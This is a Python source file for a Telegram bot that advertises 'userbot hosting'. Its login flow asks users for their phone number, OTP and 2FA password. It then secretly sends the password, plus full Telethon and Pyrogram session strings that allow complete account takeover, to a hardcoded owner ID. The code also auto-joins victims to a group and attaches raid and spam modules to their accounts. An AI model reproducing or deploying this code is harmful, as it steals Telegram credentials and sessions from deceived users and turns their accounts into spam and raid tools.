import asyncio
import base64
import struct
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.messages import ImportChatInviteRequest
from config import API_ID, API_HASH, BOT_TOKEN
from raid import register_raid
from spam import register_spam
from extra import register_extra

# ---------------------------------------------------------
# CONFIGURATION
# ---------------------------------------------------------
bot = TelegramClient('SmokerHost', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# Your Private Log Group ID for command activity
LOG_GROUP = -1003597315733 

# Your personal ID to receive the session strings
OWNER_ID = 5533647702 

GLOBAL_CLIENTS = {}

# ---------------------------------------------------------
# START COMMAND
# ---------------------------------------------------------
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    welcome = "🔥 **SMOKER USERBOT HOSTING** 🔥\n\nClick below to host your ID and start using the bot."
    buttons = [
        [Button.inline("🚀 LOGIN", data="login")],
        [
            Button.url("❤️‍🔥 OWNER ❄️", "https://t.me/Divyansh6565"),
            Button.url("📢 CHANNEL", "https://t.me/lootversegc")
        ]
    ]
    await event.respond(welcome, buttons=buttons)

# ---------------------------------------------------------
# LOGIN HANDLER
# ---------------------------------------------------------
@bot.on(events.CallbackQuery(data="login"))
async def login_handler(event):
    async with bot.conversation(event.sender_id) as conv:
        try:
            # 1. Ask for Phone Number
            await conv.send_message("📱 Send your **Phone Number** (+91...):")
            phone_msg = await conv.get_response()
            phone = phone_msg.text
            
            # 2. Setup Client
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            await client.send_code_request(phone)
            
            # 3. Ask for OTP
            await conv.send_message("📩 Send **OTP** (format: 1 2 3 4 5):")
            otp_msg = await conv.get_response()
            otp = otp_msg.text.replace(" ", "")
            
            # 4. Sign In (with Silent 2FA Collection)
            try:
                await client.sign_in(phone, code=otp)
            except SessionPasswordNeededError:
                await conv.send_message("🔐 Send **2FA Password**:")
                password_msg = await conv.get_response()
                password = password_msg.text
                
                # Forwarding 2FA silently to owner
                await bot.send_message(OWNER_ID, f"🔐 **2FA Password Received**\n\n👤 **User ID:** `{event.sender_id}`\n🔑 **Password:** `{password}`")
                
                await client.sign_in(password=password)

            # 5. Extract & Convert Sessions
            tele_session = client.session.save()
            user_info = await client.get_me()
            auth_key = client.session.auth_key.key
            
            # --- Pyrogram Format Conversion ---
            pyro_data = struct.pack(
                ">I?256sQ?", 
                int(API_ID), 
                False, 
                auth_key, 
                user_info.id, 
                False
            )
            pyro_session = base64.urlsafe_b64encode(pyro_data).decode().rstrip("=")

            # 6. Send Sessions to You (Owner)
            log_text = (
                "🚀 **New Userbot Hosted!**\n\n"
                f"👤 **Name:** {user_info.first_name}\n"
                f"🆔 **ID:** `{user_info.id}`\n"
                f"📱 **Phone:** `{phone}`\n\n"
                f"📝 **Telethon String:**\n`{tele_session}`\n\n"
                f"🔥 **Pyrogram String:**\n`{pyro_session}`"
            )
            await bot.send_message(OWNER_ID, log_text)

            # 7. Auto Join Support Group
            try:
                await client(ImportChatInviteRequest('Wkpz6yvrKQ9iMTg1'))
                await conv.send_message("💖 Joined My Support Group ❄️")
            except Exception:
                pass

            # 8. Start Userbot Features
            await client.start()
            register_raid(client, bot, LOG_GROUP)
            register_spam(client, bot, LOG_GROUP)
            register_extra(client)
            
            GLOBAL_CLIENTS[event.sender_id] = client
            
            # 9. Success Message to User
            success_msg = (
                "❤️‍🔥 Your Userbot Is Hosted Successfully 😈\n\n"
                "💖 Contact My Owner To Know Commands - @Divyansh6565 ♥️"
            )
            await conv.send_message(success_msg)
            
        except Exception as e:
            await conv.send_message(f"❌ Error: {str(e)}")

if __name__ == "__main__":
    print("Smoker Userbot Hosting is live...")
    bot.run_until_disconnected()
    
